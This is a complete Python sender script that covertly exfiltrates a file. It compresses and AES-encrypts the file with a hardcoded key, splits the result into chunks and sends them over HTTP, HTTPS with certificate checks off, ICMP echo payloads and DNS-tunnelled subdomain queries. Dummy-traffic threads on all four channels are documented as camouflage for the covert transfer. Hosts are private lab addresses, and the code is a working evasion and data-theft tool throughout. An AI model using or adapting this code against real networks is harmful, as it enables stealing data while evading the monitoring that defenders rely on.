import os
import time
import zlib
import base64
import hashlib
import requests
import threading
import random
from scapy.all import IP, ICMP, Raw, send, UDP, DNS, DNSQR
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import logging

# Suppress InsecureRequestWarning (for testing purposes only)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
http_server_ip = "192.168.186.129"  # Replace with the receiver's actual IP
http_server_port = 5000
https_server_port = 5001
dns_server_ip = "192.168.186.129"  # Replace with the DNS server's actual IP
target_ip = "192.168.186.129"      # Replace with the receiver's actual IP
MAX_FILE_SIZE = 5 * 1024 * 1024    # 5 MB

# Path to the file you want to transfer
file_path = "payload.pdf"      # Replace with your actual file path
CHUNK_SIZE = 512  # Define your chunk size

# Dummy Traffic Configuration
DUMMY_TRAFFIC_INTERVAL = 0.5  # Seconds between dummy packets

def get_acknowledged_chunks(target_ip):
    url = f"http://{target_ip}:{http_server_port}/acknowledge_chunks"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return set(data.get('received_indices', []))
        else:
            logging.warning(f"[Sender] Failed to get acknowledgments. Status code: {response.status_code}")
            return set()
    except Exception as e:
        logging.error(f"[Sender] Error getting acknowledgments: {e}")
        return set()

def read_file_payload(file_path):
    try:
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            logging.info(f"[Main] File size ({file_size} bytes) exceeds maximum allowed size. Splitting the file.")
            # Split the file into smaller parts
            return split_file(file_path, MAX_FILE_SIZE)
        else:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            return [file_data]
    except Exception as e:
        logging.error(f"[Error] Unable to read file: {e}")
        return None

def split_file(file_path, max_size):
    parts = []
    with open(file_path, 'rb') as f:
        while True:
            data = f.read(max_size)
            if not data:
                break
            parts.append(data)
    logging.info(f"[Main] File split into {len(parts)} parts.")
    return parts

def encrypt_and_compress_payload(payload):
    compressed_payload = zlib.compress(payload)
    logging.debug(f"[Debug] Compressed payload size: {len(compressed_payload)} bytes")
    key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    padded_payload = pad(compressed_payload, AES.block_size)  # Add PKCS7 padding
    encrypted = iv + cipher.encrypt(padded_payload)
    logging.debug(f"[Debug] Encrypted payload size: {len(encrypted)} bytes")
    return encrypted

def split_payload(payload):
    chunk_sizes = {
        'http': 512,
        'https': 512,
        'icmp': 256,
        'dns': 39,  # Updated chunk size to 39 bytes
    }
    protocols = ['http', 'https', 'icmp', 'dns']
    assigned_chunks = {protocol: [] for protocol in protocols}

    total_chunks = 0
    offset = 0
    while offset < len(payload):
        for protocol in protocols:
            size = chunk_sizes[protocol]
            if offset >= len(payload):
                break
            chunk = payload[offset:offset+size]
            # Removed zero-padding for incomplete chunks
            assigned_chunks[protocol].append((total_chunks, chunk))
            logging.debug(f"[Debug] Assigned chunk index {total_chunks} to protocol {protocol}")
            offset += size
            total_chunks += 1
    return assigned_chunks

def send_http_payload(chunks, target_ip):
    acknowledged_chunks = set()
    max_retries = 3
    total_retries = 0
    for retry in range(max_retries):
        if len(acknowledged_chunks) == len(chunks):
            break  # All chunks acknowledged
        # Calculate dynamic delay based on acknowledgment rate
        chunk_loss_rate = len(chunks) - len(acknowledged_chunks)
        delay = 0.1 if chunk_loss_rate < 10 else 0.3

        for i, chunk in chunks:
            if i in acknowledged_chunks:
                continue
            url = f"http://{target_ip}:{http_server_port}/receive_payload"
            chunk_b64 = base64.b64encode(chunk).decode('ascii')
            data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
            logging.debug(f"[Sender - HTTP] Sending POST request to {url} with chunk_index: {i}")
            try:
                response = requests.post(url, json=data, timeout=5)
                logging.debug(f"[Sender - HTTP] Response: {response.status_code}, {response.text}")
                if response.status_code == 200:
                    acknowledged_chunks.add(i)
            except Exception as e:
                logging.error(f"[Sender - HTTP] Error sending chunk index {i}: {e}")
            time.sleep(delay)  # Apply dynamic delay

        time.sleep(1)  # Wait for receiver to process acknowledgments
        acknowledged_chunks = get_acknowledged_chunks(target_ip)
        total_retries += 1
    else:
        logging.warning("[Sender - HTTP] Max retries reached. Some chunks may not have been received.")

    # Summary Log
    expected_chunks = set(i for i, _ in chunks)
    failed_chunks = expected_chunks - acknowledged_chunks
    logging.info(f"[Sender - HTTP] Transmission summary: Total chunks = {len(expected_chunks)}, "
                 f"Retries = {total_retries}, Failed chunks = {len(failed_chunks)}")

def send_https_payload(chunks, target_ip):
    acknowledged_chunks = set()
    max_retries = 3
    total_retries = 0
    for retry in range(max_retries):
        if len(acknowledged_chunks) == len(chunks):
            break  # All chunks acknowledged
        chunk_loss_rate = len(chunks) - len(acknowledged_chunks)
        delay = 0.1 if chunk_loss_rate < 10 else 0.3

        for i, chunk in chunks:
            if i in acknowledged_chunks:
                continue
            url = f"https://{target_ip}:{https_server_port}/receive_payload"
            chunk_b64 = base64.b64encode(chunk).decode('ascii')
            data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
            logging.debug(f"[Sender - HTTPS] Sending POST request to {url} with chunk_index: {i}")
            try:
                response = requests.post(url, json=data, verify=False, timeout=5)
                logging.debug(f"[Sender - HTTPS] Response: {response.status_code}, {response.text}")
                if response.status_code == 200:
                    acknowledged_chunks.add(i)
            except Exception as e:
                logging.error(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")
            time.sleep(delay)

        time.sleep(1)
        acknowledged_chunks = get_acknowledged_chunks(target_ip)
        total_retries += 1
    else:
        logging.warning("[Sender - HTTPS] Max retries reached. Some chunks may not have been received.")

    # Summary Log
    expected_chunks = set(i for i, _ in chunks)
    failed_chunks = expected_chunks - acknowledged_chunks
    logging.info(f"[Sender - HTTPS] Transmission summary: Total chunks = {len(expected_chunks)}, "
                 f"Retries = {total_retries}, Failed chunks = {len(failed_chunks)}")

def send_icmp_payload(chunks, target_ip):
    acknowledged_chunks = set()
    max_retries = 3
    total_retries = 0
    for retry in range(max_retries):
        if len(acknowledged_chunks) == len(chunks):
            break  # All chunks acknowledged
        for i, chunk in chunks:
            if i in acknowledged_chunks:
                continue
            payload = b'PAYLOAD|' + str(i).encode('ascii') + b'|' + chunk
            logging.debug(f"[Sender - ICMP] Sending ICMP packet with chunk index {i}")
            try:
                packet = IP(dst=target_ip)/ICMP(type=8)/Raw(load=payload)
                send(packet, verbose=False)
                # Assuming immediate acknowledgment via HTTP/HTTPS
                acknowledged_chunks.add(i)
            except Exception as e:
                logging.error(f"[Sender - ICMP] Error sending chunk index {i}: {e}")
            time.sleep(0.2)  # Delay between packets

        time.sleep(1)
        acknowledged_chunks = get_acknowledged_chunks(target_ip)
        total_retries += 1
    else:
        logging.warning("[Sender - ICMP] Max retries reached. Some chunks may not have been received.")

    # Summary Log
    expected_chunks = set(i for i, _ in chunks)
    failed_chunks = expected_chunks - acknowledged_chunks
    logging.info(f"[Sender - ICMP] Transmission summary: Total chunks = {len(expected_chunks)}, "
                 f"Retries = {total_retries}, Failed chunks = {len(failed_chunks)}")

def send_dns_payload(chunks, target_ip, dns_server_ip):
    acknowledged_chunks = set()
    max_retries = 3
    total_retries = {i:0 for i, _ in chunks}

    for i, chunk in chunks:
        for retry in range(max_retries):
            if i in acknowledged_chunks:
                break  # Already acknowledged
            chunk_b32 = base64.b32encode(chunk).decode('utf-8').rstrip('=')
            domain = f"{i}.{chunk_b32}.example.com"
            logging.debug(f"[Sender - DNS] Sending DNS query for chunk index {i} (attempt {retry+1}): {domain}")
            try:
                dns_query = IP(dst=dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                send(dns_query, verbose=False)
                total_retries[i] += 1
                time.sleep(0.3)
                # Assuming immediate acknowledgment via HTTP/HTTPS
                acknowledged_chunks.add(i)
                break  # Exit retry loop on success
            except Exception as e:
                logging.error(f"[Sender - DNS] Error sending chunk index {i}: {e}")
                time.sleep(0.3)
        else:
            logging.warning(f"[Sender - DNS] Max retries reached for chunk index {i}.")

    # Summary Log
    expected_chunks = set(i for i, _ in chunks)
    failed_chunks = expected_chunks - acknowledged_chunks
    logging.info(f"[Sender - DNS] Transmission summary: Total chunks = {len(expected_chunks)}, "
                 f"Retries per chunk = {max_retries}, Failed chunks = {len(failed_chunks)}")

def generate_dummy_http_traffic(target_ip, target_port):
    """Generate dummy HTTP traffic to camouflage covert data transmission."""
    while not stop_sniffer.is_set():
        try:
            url = f"http://{target_ip}:{target_port}/dummy"
            data = {'dummy': 'traffic'}
            requests.post(url, json=data, timeout=2)
        except:
            pass
        time.sleep(DUMMY_TRAFFIC_INTERVAL)

def generate_dummy_https_traffic(target_ip, target_port):
    """Generate dummy HTTPS traffic to camouflage covert data transmission."""
    while not stop_sniffer.is_set():
        try:
            url = f"https://{target_ip}:{target_port}/dummy"
            data = {'dummy': 'traffic'}
            requests.post(url, json=data, verify=False, timeout=2)
        except:
            pass
        time.sleep(DUMMY_TRAFFIC_INTERVAL)

def generate_dummy_icmp_traffic(target_ip):
    """Generate dummy ICMP traffic to camouflage covert data transmission."""
    while not stop_sniffer.is_set():
        try:
            packet = IP(dst=target_ip)/ICMP()/"Dummy ICMP traffic"
            send(packet, verbose=False)
        except:
            pass
        time.sleep(DUMMY_TRAFFIC_INTERVAL)

def generate_dummy_dns_traffic(target_ip, dns_server_ip):
    """Generate dummy DNS traffic to camouflage covert data transmission."""
    while not stop_sniffer.is_set():
        try:
            domain = f"dummy{random.randint(1000,9999)}.example.com"
            dns_query = IP(dst=dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
            send(dns_query, verbose=False)
        except:
            pass
        time.sleep(DUMMY_TRAFFIC_INTERVAL)

# Main
if __name__ == "__main__":
    # Set up logging
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[
                            logging.FileHandler("sender.log"),
                            logging.StreamHandler()
                        ])
    
    # Start dummy traffic threads
    dummy_threads = []
    dummy_threads.append(threading.Thread(target=generate_dummy_http_traffic, args=(http_server_ip, http_server_port), daemon=True))
    dummy_threads.append(threading.Thread(target=generate_dummy_https_traffic, args=(http_server_ip, https_server_port), daemon=True))
    dummy_threads.append(threading.Thread(target=generate_dummy_icmp_traffic, args=(target_ip,), daemon=True))
    dummy_threads.append(threading.Thread(target=generate_dummy_dns_traffic, args=(http_server_ip, dns_server_ip), daemon=True))
    
    for thread in dummy_threads:
        thread.start()
    
    # Read and process the file
    file_payload = read_file_payload(file_path)
    if file_payload is None:
        logging.error("[Main] Exiting due to file read error.")
        exit(1)

    # Process each subfile (in case of split files)
    for subfile_index, subfile in enumerate(file_payload):
        logging.info(f"[Main] Processing subfile {subfile_index + 1}/{len(file_payload)}...")

        # Encrypt and compress each subfile
        encrypted_payload = encrypt_and_compress_payload(subfile)
        logging.info(f"[Main] Encrypted payload size for subfile {subfile_index + 1}: {len(encrypted_payload)} bytes")

        # Split encrypted payload into chunks
        assigned_chunks = split_payload(encrypted_payload)

        # Send payload over all protocols
        logging.info("[Main] Sending payload over HTTP...")
        send_http_payload(assigned_chunks['http'], http_server_ip)

        logging.info("[Main] Sending payload over HTTPS...")
        send_https_payload(assigned_chunks['https'], http_server_ip)

        logging.info("[Main] Sending payload over ICMP...")
        send_icmp_payload(assigned_chunks['icmp'], target_ip)

        logging.info("[Main] Sending payload over DNS...")
        send_dns_payload(assigned_chunks['dns'], target_ip, dns_server_ip)

    logging.info("[Main] All subfiles processed successfully.")

    # Keep the script running to allow dummy traffic generation
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("[Main] Exiting.")
        stop_sniffer.set()
